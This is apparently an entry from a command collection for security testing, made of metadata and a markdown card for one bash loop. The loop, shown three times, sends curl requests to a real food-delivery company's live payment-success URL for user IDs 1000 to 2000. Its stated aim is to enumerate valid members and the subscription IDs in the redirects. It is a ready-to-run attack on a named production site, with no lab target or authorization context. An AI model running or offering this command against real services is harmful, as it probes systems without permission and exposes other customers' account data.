---
id: cmd-uuid-005
data: >-
  for uid in {1000..2000}; do curl -X GET
  "https://www.zomato.com/gold/payment-success?user_id=$uid" -i -L -w
  "%{http_code} %{redirect_url}\n"; done
tags:
  - fuzzing
  - enumeration
  - web
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:29.649Z'
verified: false
validated: true
submitted: true
---
# curl-fuzz-user-ids

## Command

```bash
for uid in {1000..2000}; do curl -X GET "https://www.zomato.com/gold/payment-success?user_id=$uid" -i -L -w "%{http_code} %{redirect_url}\n"; done
```

## Description

Loops through user_ids to fuzz and detect redirects for enumeration.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `{1000..2000}` | Range of user_ids | Yes |
| `-w` | Custom output format | Yes |

## Examples

### Basic Usage

```bash
for uid in {1000..2000}; do curl -X GET "https://www.zomato.com/gold/payment-success?user_id=$uid" -i -L -w "%{http_code} %{redirect_url}\n"; done
```

## Expected Output

Lines like "301 https://...subscription_id=..." for valid members.

## Related

- [[Related Procedure]]
